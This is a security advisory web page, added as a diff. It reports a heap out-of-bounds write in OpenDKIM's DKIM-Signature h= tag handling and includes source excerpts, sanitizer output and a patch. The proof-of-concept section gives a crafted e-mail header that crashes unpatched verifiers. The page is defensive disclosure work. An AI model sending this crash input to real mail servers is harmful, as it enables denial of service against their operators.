@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>OpenDKIM heap out-of-bounds write in dkim_canon_selecthdrs() via the DKIM-Signature h= tag (OpenDKIM ≤ 2.11.0)</title>
+<style>
+:root { color-scheme: light dark; --fg:#111; --bg:#fff; --muted:#555; --rule:#ddd; --pre:#f5f5f5; --link:#14508c; }
+@media (prefers-color-scheme: dark) {
+  :root { --fg:#e4e4e4; --bg:#161616; --muted:#a0a0a0; --rule:#333; --pre:#1e1e1e; --link:#7fb2e5; }
+}
+body { max-width: 46rem; margin: 2.5rem auto; padding: 0 1.1rem 4rem; background: var(--bg); color: var(--fg);
+       font: 16px/1.6 -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; }
+h1 { font-size: 1.35rem; line-height: 1.35; margin: 0 0 1rem; }
+h2 { font-size: 1.05rem; margin: 2rem 0 .6rem; }
+p, li { margin: .6rem 0; }
+a { color: var(--link); }
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: .87em; }
+pre { background: var(--pre); border: 1px solid var(--rule); padding: .75rem .85rem; overflow-x: auto;
+      font-size: .82rem; line-height: 1.45; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+table { border-collapse: collapse; width: 100%; font-size: .87rem; margin: .7rem 0; }
+th, td { border: 1px solid var(--rule); padding: .35rem .5rem; text-align: left; vertical-align: top; }
+.scroll { overflow-x: auto; }
+.hdr { font-size: .93rem; color: var(--muted); margin: 0 0 1.6rem; }
+.hdr b { color: var(--fg); font-weight: 600; }
+.lead { border-left: 3px solid var(--rule); padding-left: .85rem; margin: 0 0 1.6rem; }
+footer { margin-top: 3rem; padding-top: .8rem; border-top: 1px solid var(--rule);
+         color: var(--muted); font-size: .84rem; }
+</style>
+</head>
+<body>
+
+<h1>OpenDKIM heap out-of-bounds write in dkim_canon_selecthdrs() via the DKIM-Signature h= tag (OpenDKIM ≤ 2.11.0)</h1>
+
+<p class="hdr">
+<b>Author:</b> <a href="https://weitongli.com/">Weitong Li</a>, Virginia Tech &lt;weitongli@vt.edu&gt;<br>
+<b>Date:</b> 2026-07-31<br>
+<b>Vendor:</b> <a href="http://www.trusteddomain.org/">The Trusted Domain Project</a><br>
+<b>Software:</b> <a href="http://www.opendkim.org/">OpenDKIM (libopendkim)</a><br>
+<b>Affected version:</b> OpenDKIM 2.11.0 (Debian package <code>2.11.0~beta2-9.1+b1</code>) and current upstream <code>master</code>. The defective loop is long-standing; earlier 2.x releases are expected to be affected.<br>
+<b>Vulnerable component:</b> <code>libopendkim/dkim-canon.c</code>, <code>dkim_canon_selecthdrs()</code> line 1052, reached from <code>dkim_canon_runheaders()</code> during <code>dkim_eoh()</code><br>
+<b>Vulnerability type:</b> CWE-787 (Out-of-bounds Write)<br>
+<b>Attack vector:</b> Remote, unauthenticated. One inbound e-mail carrying a DKIM-Signature header.<br>
+<b>CVSS v3.1:</b> 8.2 (High) &mdash; <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H</code><br>
+<b>Status:</b> AddressSanitizer-confirmed with a fuzzer-derived crashing input; the proposed fix was applied, libopendkim rebuilt, and the same input then ran clean.
+</p>
+
+<p class="lead"><b>Impact.</b> A crafted signed-header list writes an 8-byte pointer one element past a heap allocation on every inbound signed message.</p>
+
+<h2>Description</h2>
+<p>An out-of-bounds heap write of a controlled-position, fixed-value (NULL) pointer. The immediate, reliably demonstrated consequence is memory corruption of whatever the allocator placed after <code>lhdrs</code>, which in a milter process means a crash and therefore a denial of service against mail processing. Because the overflow writes NULL rather than attacker-chosen bytes, and the position past the buffer is bounded, this is not a straightforward path to code execution; the precise effect depends on heap layout and is not fully characterised here.</p>
+<p>Reachability is the significant part: the trigger is the <code>h=</code> tag of a DKIM-Signature header, which is parsed on every inbound signed message by every OpenDKIM deployment, with no authentication and no user interaction.</p>
+<p><code>dkim_canon_selecthdrs()</code> allocates the <code>lhdrs</code> array to hold exactly <code>dkim_hdrcnt</code> header pointers — one slot per header present in the message — but then iterates over the tokens of the attacker-supplied <code>h=</code> tag. Each iteration begins by writing <code>lhdrs[shcnt] = NULL</code> <em>before</em> any bounds test. A <code>h=</code> tag that lists more matching header names than the message actually contains drives <code>shcnt</code> up to <code>dkim_hdrcnt</code>, and the following iteration stores a pointer one element past the end of the buffer.</p>
+<p>The function does contain a bounds check, <code>if (shcnt &gt; nptrs)</code>, but it runs after the loop has finished and therefore never prevents the write. The <code>h=</code> tag is fully attacker-controlled and is parsed on every inbound signed message, so the write is reachable remotely without authentication.</p>
+<p>The allocation and the loop, condensed from <code>dkim-canon.c</code>:</p>
+<pre><code>n = dkim-&gt;dkim_hdrcnt * sizeof(struct dkim_header *);
+lhdrs = DKIM_MALLOC(dkim, n);            /* exactly dkim_hdrcnt elements */
+...
+shcnt = 0;
+for (c = 0; c &lt; n /* number of h= tokens */; c++)
+{
+        lhdrs[shcnt] = NULL;             /* dkim-canon.c:1052 - unbounded write */
+        ...
+        for (hdr = ...; hdr; hdr = hdr-&gt;hdr_next)
+                if (match) lhdrs[shcnt] = hdr;
+        if (lhdrs[shcnt] != NULL)
+        {
+                lhdrs[shcnt]-&gt;hdr_flags |= DKIM_HDR_SIGNED;
+                shcnt++;
+        }
+}
+
+if (shcnt &gt; nptrs) { ... }                /* bounds check runs only after the loop */</code></pre>
+<p>Two counters are conflated. <code>lhdrs</code> is sized by the number of headers in the message, while the loop is driven by the number of tokens in <code>h=</code>. RFC 6376 permits a signer to list a header name in <code>h=</code> more than once (over-signing), and the verifier must tolerate an <code>h=</code> that names headers the message does not carry, so the two counts are independent by design and a signature that makes them diverge is not itself malformed.</p>
+<p>The AddressSanitizer report:</p>
+<pre><code>==ERROR== AddressSanitizer: heap-buffer-overflow
+WRITE of size 8 at 0x... thread T0
+    #0 dkim_canon_selecthdrs dkim-canon.c:1052
+    #1 dkim_canon_runheaders</code></pre>
+
+<h2>Proof of Concept</h2>
+<p>The crashing input was produced by an in-process libFuzzer harness driving the public verification path (<code>dkim_chunk()</code> then <code>dkim_eom()</code>) under AddressSanitizer. It is an ordinary RFC 5322 message with a small header block whose DKIM-Signature <code>h=</code> tag lists more matching header names than the message has headers, for example:</p>
+<pre><code>From: a@example.com
+Subject: x
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=example.com; s=s1;
+ h=from:from:from:from:subject:subject:subject:subject:from:subject;
+ bh=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=;
+ b=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+
+body</code></pre>
+<p>Build <code>libopendkim</code> with <code>-fsanitize=address</code>, link the verification harness, and feed it the message. The signature does not need to verify: the crash happens during header canonicalisation in <code>dkim_eoh()</code>, before any cryptographic check.</p>
+<pre><code># build libopendkim with ASAN, then
+./fuzz_odkim_verify crashes_dkv/dkv-crash-42df1857...
+==ERROR== AddressSanitizer: heap-buffer-overflow WRITE of size 8
+          ... dkim_canon_selecthdrs dkim-canon.c:1052</code></pre>
+
+<h2>Mitigation</h2>
+<p>Bound the index inside the loop, before the write:</p>
+<pre><code> for (c = 0; c &lt; n; c++)
+ {
++        if (shcnt &gt;= dkim-&gt;dkim_hdrcnt)   /* or &gt;= nptrs */
++                break;
+         lhdrs[shcnt] = NULL;</code></pre>
+<p>Equivalently, size <code>lhdrs</code> for <code>MAX(dkim_hdrcnt, number of h= tokens)</code> and keep the existing post-loop check. The first form was applied to the tree, <code>libopendkim</code> rebuilt, and the crashing input then ran clean with no AddressSanitizer report.</p>
+
+<h2>Notes</h2>
+<p>Distinct from the two <code>dkim_qp_decode()</code> defects, <code>opendkim-qp-off-by-one</code> and <code>opendkim-qp-truncated-escape</code>: this crash still reproduces against a library patched for both of those.</p>
+<p>Found against upstream <code>master</code>. The exploitability ceiling beyond a crash has not been investigated, and this report deliberately does not claim code execution.</p>
+
+<h2>References</h2>
+<ul>
+<li><a href="https://www.rfc-editor.org/rfc/rfc6376#section-3.5">RFC 6376 - DomainKeys Identified Mail (DKIM) Signatures, section 3.5 (the h= tag)</a></li>
+<li><a href="https://www.rfc-editor.org/rfc/rfc6376#section-5.4.2">RFC 6376 section 5.4.2 - signatures involving multiple instances of a field</a></li>
+<li><a href="https://cwe.mitre.org/data/definitions/787.html">CWE-787: Out-of-bounds Write</a></li>
+<li><a href="http://www.opendkim.org/">OpenDKIM project</a></li>
+<li><a href="https://weitongli.com/">Weitong Li, Virginia Tech - researcher homepage</a></li>
+</ul>
+
+<footer>
+<p>Reported by <a href="https://weitongli.com/">Weitong Li</a>, Virginia Tech
+(<a href="mailto:weitongli@vt.edu">weitongli@vt.edu</a>).
+Reproduction environment and full evidence available to the vendor on request.
+CVSS is the researcher's own assessment.</p>
+</footer>
+
+</body>
+</html>
